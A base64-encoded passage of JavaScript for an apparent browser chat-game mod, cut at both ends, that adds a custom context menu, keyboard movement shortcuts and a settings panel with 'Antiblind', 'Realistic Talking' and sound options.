lLmRpc3BsYXkgPSAiYmxvY2siOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9CiAgCgogIC8vIEhpZGUgdGhlIGRyb3Bkb3duIG1lbnUKICBzZWxlY3Quc3R5bGUuZGlzcGxheSA9ICJub25lIjsKfSk7CgovL0VuZCBvZiBERCBtZW51X19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCi8vIEFkZCBoZWFkZXIsIGJ1dHRvbnMsIGFuZCBzZXBhcmF0b3IgdG8gY29udGV4dCBtZW51CgpmdW5jdGlvbiB1cGRhdGVDb250ZXh0TWVudSgpIHsKICB3aGlsZSAoY29udGV4dE1lbnUuZmlyc3RDaGlsZCkgewogICAgY29udGV4dE1lbnUucmVtb3ZlQ2hpbGQoY29udGV4dE1lbnUuZmlyc3RDaGlsZCk7CiAgfQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGhlYWRlcik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoY3JlYXRlU2VwYXJhdG9yKCkpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjEpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjMpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjQpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjUpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjYpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjcpOwogIGlmICh2aXNiKSB7CiAgICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b244KTsKICB9IGVsc2UgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOSk7CiAgfQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjEwKTsKICAvLyBBZGQgdGhlIGRyb3Bkb3duIG1lbnUgdG8gdGhlIGNvbnRleHQgbWVudQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChkcm9wZG93bkJ1dHRvbik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoc2VsZWN0KTsKICAKfQoKdXBkYXRlQ29udGV4dE1lbnUoKTsKCi8vIEV2ZW50IGxpc3RlbmVyIHRvIHVwZGF0ZSB0aGUgbWVudSB3aGVuIG9wZW5lZApjb250ZXh0TWVudS5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKCkgewogIHVwZGF0ZUNvbnRleHRNZW51KCk7Cn0pOwoKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CgogICAgCn0pOwoKLy8gRnVuY3Rpb24gdG8gaGlkZSB0aGUgY3VzdG9tIGNvbnRleHQgbWVudQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgaWYgKGNvbnRleHRNZW51T3BlbikgewogICAgICAgIHZhciBjb250ZXh0TWVudSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltzdHlsZSo9J2ZpeGVkJ10iKTsKICAgICAgICBpZiAoY29udGV4dE1lbnUpIHsKICAgICAgICAgICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgICAgIH0KICAgICAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIH0KfSk7CgoKLy9TdGFydCBvZiBrZXlib2FyZCBzaG9ydGN1dHNfX19fX19fX19fX19fX19fX19fCgpsZXQgYmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CmxldCBsYXN0S2V5UHJlc3NlZCA9IG51bGw7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sgKGApIGtleSBpcyBwcmVzc2VkCiAgaWYgKGV2ZW50LmtleSA9PT0gImAiICYmICFiYWNrdGlja1ByZXNzZWQpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfQogIC8vIGNoZWNrIGlmIHRoZSBiYWNrdGljayAoYCkga2V5IGlzIHByZXNzZWQgYW5kIHN0b3JlIHRoZSBsYXN0IGtleSBwcmVzc2VkCiAgZWxzZSBpZiAoYmFja3RpY2tQcmVzc2VkKSB7CiAgICBsYXN0S2V5UHJlc3NlZCA9IGV2ZW50LmtleTsKICB9Cn0pOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCBmdW5jdGlvbihldmVudCkgewogIC8vIGNoZWNrIGlmIHRoZSBiYWNrdGljayAoYCkga2V5IGlzIHJlbGVhc2VkCiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICAgIGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKICB9Cn0pOwoKLy8gY2hlY2sgaWYgdGhlIGxhc3Qga2V5IHByZXNzZWQgd2FzICIsIiBvciAiLiIgYW5kIHNlbmQgdGhlIGNvcnJlc3BvbmRpbmcgYWN0aW9uCnNldEludGVydmFsKGZ1bmN0aW9uKCkgewogIGlmIChsYXN0S2V5UHJlc3NlZCA9PT0gIiwiIHx8IGxhc3RLZXlQcmVzc2VkID09PSAiLiIpIHsKICAgIGxldCBhY3Rpb24gPSBsYXN0S2V5UHJlc3NlZCA9PT0gIiwiID8gIk1vdmVMZWZ0IiA6ICJNb3ZlUmlnaHQiOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsKICAgICAgTWVtYmVyTnVtYmVyOiBQbGF5ZXIuTWVtYmVyTnVtYmVyLAogICAgICBBY3Rpb246IGFjdGlvbiwKICAgIH0pOwogIH0KfSwgNTApOwovL1N0YXJ0IG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCi8vIERlZmluZSB0aGUgc2V0dGluZ3MgbWVudSBhbmQgaXRzIG9wdGlvbnMKY29uc3Qgc2V0dGluZ3NNZW51ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnNldHRpbmdzTWVudS5pZCA9ICJzZXR0aW5ncy1tZW51IjsKc2V0dGluZ3NNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKc2V0dGluZ3NNZW51LnN0eWxlLnRvcCA9ICIyMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmxlZnQgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2ZmZiI7CnNldHRpbmdzTWVudS5zdHlsZS5ib3JkZXIgPSAiMXB4IHNvbGlkICNjY2MiOwpzZXR0aW5nc01lbnUuc3R5bGUucGFkZGluZyA9ICIzcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjEwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKc2V0dGluZ3NNZW51LnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKCi8vQkNNIGxvZ28gICAKY29uc3QgY29tcGFueUxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKY29tcGFueUxvZ28uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CmNvbXBhbnlMb2dvLnN0eWxlLmZsb2F0ID0gImxlZnQiOwpjb21wYW55TG9nby5zdHlsZS5tYXJnaW5SaWdodCA9ICIxMHB4IjsKY29tcGFueUxvZ28uc3R5bGUud2lkdGggPSAiNDBweCI7IC8vIEFkanVzdCBsb2dvIHNpemUgYXMgbmVlZGVkCmNvbXBhbnlMb2dvLnN0eWxlLmhlaWdodCA9ICI0MHB4IjsgLy8gQWRqdXN0IGxvZ28gc2l6ZSBhcyBuZWVkZWQKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKGNvbXBhbnlMb2dvKTsKCi8vT3B0aW9ucyBhbmQgc3R5bGVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKY29uc3Qgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjEudGV4dENvbnRlbnQgPSAiQW50aWJsaW5kIjsKY29uc3QgY2hlY2tib3gxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gxLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDEuaWQgPSAib3B0aW9uMSI7CmNoZWNrYm94MS5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDEuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24xLmFwcGVuZENoaWxkKGNoZWNrYm94MSk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24xKTsKCmNvbnN0IG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24yLnRleHRDb250ZW50ID0gIlJlYWxpc3RpYyBUYWxraW5nIjsKY29uc3QgY2hlY2tib3gyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gyLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDIuaWQgPSAib3B0aW9uMiI7CmNoZWNrYm94Mi5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDIuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24yLmFwcGVuZENoaWxkKGNoZWNrYm94Mik7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24yKTsKCmNvbnN0IG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24zLnRleHRDb250ZW50ID0gIlNvdW5kIjsKY29uc3QgY2hlY2tib3gzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gzLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDMuaWQgPSAib3B0aW9uMyI7CmNoZWNrYm94My5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDMuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24zLmFwcGVuZENoaWxkKGNoZWNrYm94Myk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24zKTsKCi8vIEFkZCBzb21lIGJhc2ljIHN0eWxpbmcgdG8gdGhlIGxhYmVscwpvcHRpb24xLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjEuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjEuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24xLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24yLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjIuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24yLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24zLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjMuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjMuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24zLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgovLyBBZGQgc29tZSBiYXNpYyBob3ZlciBlZmZlY3RzIHRvIHRoZSBsYWJlbHMKb3B0aW9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMS5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCm9wdGlvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjIuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpvcHRpb24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24zLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKLy8gQ2hlY2sgdGhlIGNoZWNrYm94IHN0YXRlIHdoZW4gdGhlIHBhZ2UgbG9hZHMKY2hlY2tib3gxLmNoZWNrZWQgPyBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDIuY2hlY2tlZCA/IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CmNoZWNrYm94My5jaGVja2VkID8gb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCgovLyBDaGFuZ2UgdGhlIGxhYmVsIGJhY2tncm91bmQgY29sb3Igd2hlbiB0aGUgY2hlY2tib3ggaXMgY2hlY2tlZApjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKY2hlY2tib3gzLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgovL09wdGlvbnMgQWN0aW9uc19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovLyBEZWZpbmUgdGhlIGZ1bmN0aW9uIHRvIHJ1biBpbnNpZGUgc2V0SW50ZXJ2YWwgZm9yIG9wdGlvbiAxCmZ1bmN0aW9uIHJ1bk9wdGlvbjEoKSB7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgZnVuY3Rpb24gR2V0QmxpbmRMZXZlbDAoKSB7CiAgICAgICAgbGV0IGJsaW5kTGV2ZWwgPSAwOwogICAgICAgIHJldHVybiBibGluZExldmVsOwogICAgICB9CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsID0gR2V0QmxpbmRMZXZlbDA7CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsKCk7CiAgICB9CiAgfQogIAogIC8vIERlZmluZSB0aGUgZnVuY3Rpb24gdG8gcnVuIGluc2lkZSBzZXRJbnRlcnZhbCBmb3Igb3B0aW9uIDIKICBmdW5jdGlvbiBydW5PcHRpb24yKCkgewogICAgZnVuY3Rpb24gUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAoKSB7CiAgICAgIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiTW91dGgiLCBleHByZXNzaW9uQW5pbWF0aW9uW2V4cHJlc3Npb25BbmltYXRpb25JbmRleCsrXSk7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPCBleHByZXNzaW9uQW5pbWF0aW9uLmxlbmd0aCkgewogICAgICAgIHNldFRpbWVvdXQoUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAsIDEwMDApOwogICAgICB9IGVsc2UgewogICAgICAgIGV4cHJlc3Npb25BbmltYXRpb24gPSBudWxsOwogICAgICB9CiAgICB9CiAgCiAgICBmdW5jdGlvbiBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKGxpc3QpIHsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb24pIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbiA9IGxpc3Q7CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA9IDA7CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb25FeCA9IEludmVudG9yeUdldChQbGF5ZXIsICJNb3V0aCIpOwogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbkV4ICYmIGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eSAmJiBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkuRXhwcmVzc2lvbikgewogICAgICAgIGV4cHJlc3Npb25BbmltYXRpb25bZXhwcmVzc2lvbkFuaW1hdGlvbi5sZW5ndGggLSAxXSA9IGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eS5FeHByZXNzaW9uOyAvL3NldCBsYXN0IHRvIGN1cnJlbnQKICAgICAgfQogICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCgpOwogICAgfQogIAogICAgZnVuY3Rpb24gTkVXdGFsa2luZygpIHsKICAgICAgdmFyIG1zZyA9IEVsZW1lbnRWYWx1ZSgiSW5wdXRDaGF0IikudHJpbSgpOwogICAgICBpZiAoIW1zZy5zdGFydHNXaXRoKCIvIikgJiYgIW1zZy5zdGFydHNXaXRoKCIqIikgJiYgIW1zZy5zdGFydHNXaXRoKCIhIikpIHsKICAgICAgICBpZiAobXNnLmxlbmd0aCA+IDEwKSB7CiAgICAgICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKFtudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbF0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKFtudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGxdKTsKICAgICAgICB9CiAgICAgIH0KICAgICAgT0xEdGFsa2luZygpOwogICAgfQogIAogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHZhciBleHByZXNzaW9uQW5pbWF0aW9uOwogICAgICB2YXIgZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4ID0gMDsKICAgICAgdmFyIE9MRHRhbGtpbmcgPSBDaGF0Um9vbVNlbmRDaGF0OwogICAgICBDaGF0Um9vbVNlbmRDaGF0ID0gTkVXdGFsa2luZzsKICAgIH0KICB9CgogIGZ1bmN0aW9uIHJ1bk9wdGlvbjMoKSB7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICAgICAgICBBdWRpb1BsYXlJbnN0YW50U291bmQoImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDkwNTMwNDc5MDgzNjMwNjcyL2g0MnZ3Y2Qtbm90aWZpY2F0aW9uLTFfdk1xaFZsdFMubXAzIiwgMSk7CiAgICAgICAgLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKICAgICAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICM0Q0FGNTAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKICAgIHN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogICAgc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwogICAgCiAgICAKICAgIC8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAogICAgLy8gQWRkIHRoZSBjdXN0b20gQkNNIGljb24KICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIAogICAgLy8gQWRkIHRoZSB0ZXh0IG1lc3NhZ2UKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKICAgIAogICAgICAgIAogICAgICAKICAgICAgICAvLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byB0aGUgYm9keQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogICAgICAKICAgICAgICAvLyBTaG93IHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBpbiBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlz